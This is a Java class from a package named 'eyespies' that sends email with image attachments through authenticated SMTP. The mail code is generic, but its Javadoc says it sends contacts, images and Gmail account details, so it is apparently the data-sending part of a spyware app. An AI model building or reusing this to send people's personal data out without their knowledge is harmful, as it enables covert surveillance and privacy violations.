package com.eyespies.service;

import java.io.File;
import java.util.List;
import java.util.Properties;

import javax.activation.DataHandler;
import javax.activation.DataSource;
import javax.activation.FileDataSource;
import javax.mail.Authenticator;
import javax.mail.BodyPart;
import javax.mail.Message.RecipientType;
import javax.mail.MessagingException;
import javax.mail.Part;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;


public class SMTPSendEmail extends Authenticator{

	private static String mUserName;
	private static String mPassword;
	private static String mHostName;

	/**
	 * sends the contact details, images as attachment and account details of the gmail accounts configured
	 * @param user
	 * @param password
	 * @param hostname
	 * @param recipient
	 * @param body
	 * @param imageList
	 * @param listOfAccounts
	 * @throws AddressException
	 * @throws MessagingException
	 */
	public void sendEmailTo(String user, String password, String hostname, String recipient, String body,List<String> imageList,String subject)  throws AddressException, MessagingException{

		mUserName=user;
		mPassword=password;
		mHostName=hostname;

		Properties props = getProperties();

		// this object will handle the authentication
		Session session=Session.getInstance(props,this);
		MimeMessage emailMessage=new MimeMessage(session);
		BodyPart msgBody=new MimeBodyPart();
		MimeMultipart bodyMultipart=new MimeMultipart();


		emailMessage.setFrom(new InternetAddress(mUserName));
		emailMessage.setRecipient(RecipientType.TO, new InternetAddress(recipient));  

		emailMessage.setSubject(subject);    
		msgBody.setText(body);   
		bodyMultipart.addBodyPart(msgBody);
		int length=0;
		/******/
		if(imageList != null ) {
			bodyMultipart = addImages(imageList, bodyMultipart, length);
		}

		emailMessage.setContent(bodyMultipart);
		Transport transport = session.getTransport("smtp");

		transport.connect(user, password);
		transport.sendMessage(emailMessage, emailMessage.getAllRecipients());

		transport.close();
		System.out.println("sent the message!!");
	}

	private MimeMultipart addImages(List<String> imageList, MimeMultipart bodyMultipart,
			int length) throws MessagingException {
		for(String s:imageList){
			if(length>2000000) {
				System.out.println("length: " + length);
				break;
			}
			File image = new File(s);
			DataSource source = new FileDataSource(image);
			System.out.println("file size: " +s+ image.length());
			MimeBodyPart messageBodyPart = new MimeBodyPart();
			messageBodyPart.setDataHandler(new DataHandler(source));

			messageBodyPart.setFileName(s);
			messageBodyPart.setDisposition(Part.INLINE);
			bodyMultipart.addBodyPart(messageBodyPart);   //add the image to the email
			length += image.length();
		}
		return bodyMultipart;
	}

	private static Properties getProperties(){
		Properties props = new Properties(); 
		props.put("mail.smtp.host", mHostName);   
		props.put("mail.smtp.auth", "true");           
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.port", "587");
		return props;
	}

	@Override 
	public PasswordAuthentication getPasswordAuthentication() { 
		return new PasswordAuthentication(mUserName, mPassword); 
	} 
}
